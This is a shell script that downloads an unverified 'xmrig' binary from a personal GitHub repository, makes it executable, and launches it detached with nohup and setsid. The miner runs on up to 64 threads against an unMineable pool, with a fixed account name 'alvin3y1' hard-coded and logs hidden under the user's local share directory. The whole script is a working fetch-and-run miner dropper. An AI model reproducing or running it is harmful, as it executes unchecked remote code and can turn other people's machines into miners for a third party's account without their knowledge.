#!/bin/sh
set -eu

XMRIG_URL="https://github.com/alvin3y/lov-remote/raw/refs/heads/main/xmrig"
INSTALL_DIR="${XDG_DATA_HOME:-"$HOME/.local/share"}/unmineable-xmrig"
XMRIG="$INSTALL_DIR/xmrig"
LOG_FILE="$INSTALL_DIR/xmrig.log"
THREADS="${1:-${THREADS:-64}}"
POOL="${POOL:-rx-us.unmineable.com:3333}"

case "$THREADS" in
    ''|*[!0-9]*|0) echo "threads must be a positive integer" >&2; exit 2 ;;
esac

mkdir -p "$INSTALL_DIR"
TEMP_XMRIG="$XMRIG.download.$$"
trap 'rm -f "$TEMP_XMRIG"' EXIT HUP INT TERM

curl -fL --retry 3 --connect-timeout 15 "$XMRIG_URL" -o "$TEMP_XMRIG"
chmod 700 "$TEMP_XMRIG"
mv "$TEMP_XMRIG" "$XMRIG"

WORKER="worker-$(od -An -N6 -tx1 /dev/urandom | tr -d '[:space:]')"
echo "Starting detached $WORKER with $THREADS thread(s)"

nohup setsid -f "$XMRIG" \
    -o "$POOL" \
    -a rx \
    -k \
    -u "alvin3y1.$WORKER" \
    -p x \
    -t "$THREADS" \
    </dev/null >>"$LOG_FILE" 2>&1
